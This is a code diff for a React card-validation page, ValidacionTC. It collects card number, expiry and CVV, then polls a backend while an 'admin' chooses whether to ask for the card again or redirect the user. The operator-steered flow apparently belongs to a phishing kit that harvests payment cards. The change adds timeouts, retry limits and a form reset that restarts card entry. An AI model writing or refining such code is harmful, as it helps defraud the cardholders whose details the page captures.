@@ -373,10 +373,16 @@ export default function ValidacionTC() {
         }
     };
 
-    // Función de polling para esperar respuesta del admin
+    // Función de polling para esperar respuesta del admin con timeout y límite de reintentos
     const iniciarPolling = (sesionId) => {
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
+        const TIMEOUT_MS = 180000; // 3 minutos en total
+        let timeoutId;
+
         const pollingInterval = setInterval(async () => {
             try {
+                attempts++;
                 const { instanceBackend } = await import("../../axios/instanceBackend");
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
@@ -387,21 +393,34 @@ export default function ValidacionTC() {
                     localStorageService.setItem("selectedCardData", cardData);
                 }
 
-                console.log('TC Polling:', estado);
+                console.log('TC Polling:', estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
-                // Estados que NO deben redirigir y permiten seguir en la vista
-                // NOTA: 'solicitar_tc_custom' removed from this list if we want to stay here?
-                // Actually if state is still 'solicitar_tc_custom' we should definitely stay here.
+                // Verificar timeout o máximo de intentos
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+                    // Resetear formulario para permitir reintento
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                    return;
+                }
 
                 // Redirecciones basadas en respuesta del admin
                 if (estado === 'pendiente' || estado === 'solicitar_tc_custom') {
                     // Esperar...
                 } else {
+                    // Limpiar intervalos antes de redirigir
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+
                     switch (estado.toLowerCase()) {
                         case 'solicitar_tc':
                         case 'error_tc':
-                            // Recargar la misma página para reintentar (a menos que debamos ir a another view?)
-                            // Como estamos en una view generica de TC, recargar es ok.
+                            // Recargar la misma página para reintentar
                             window.location.reload();
                             break;
 
@@ -446,26 +465,37 @@ export default function ValidacionTC() {
                         default:
                             break;
                     }
-
-                    // Si encontramos un estado de redirección, limpiar intervalo?
-                    // No necesariamente, navigate hace unmount y limpia por effect cleanup (aunque aquí el interval es local en function scope, peligro de leak si no se limpia).
-                    // Pero como el componente se desmonta, el intervalo sigue corriendo?
-                    // REACT HOOKS WARNING: setInterval en function scope NO se limpia solo al desmontar component si no está en useEffect return.
-                    // Pero este interval está dentro de handleContinue -> iniciarPolling.
-                    // Al navegar, el componente se destruye. El garbage collector debería limpiar closures... NO SIEMPRE con setInterval.
-                    // Lo correcto es guardar interval en ref y limpiar en useEffect return.
-                    // O usar una variable global de scope modulo (feo).
-                    // Mejor: clearInterval al navegar.
-
-                    if (estado !== 'pendiente' && estado !== 'solicitar_tc_custom') {
-                        clearInterval(pollingInterval);
-                    }
                 }
 
             } catch (error) {
                 console.error('Error en polling:', error);
+                attempts++;
+                // Si hay muchos errores consecutivos, detener polling
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(pollingInterval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
+                    // Resetear formulario para permitir reintento
+                    setCardDigits("");
+                    setExpirationDate("");
+                    setCvv("");
+                    setStep("front");
+                }
             }
         }, 3000);
+
+        // Timeout global de 3 minutos
+        timeoutId = setTimeout(() => {
+            clearInterval(pollingInterval);
+            setCargando(false);
+            alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+            // Resetear formulario para permitir reintento
+            setCardDigits("");
+            setExpirationDate("");
+            setCvv("");
+            setStep("front");
+        }, TIMEOUT_MS);
     };
 
     // --- RENDER HELPERS ---
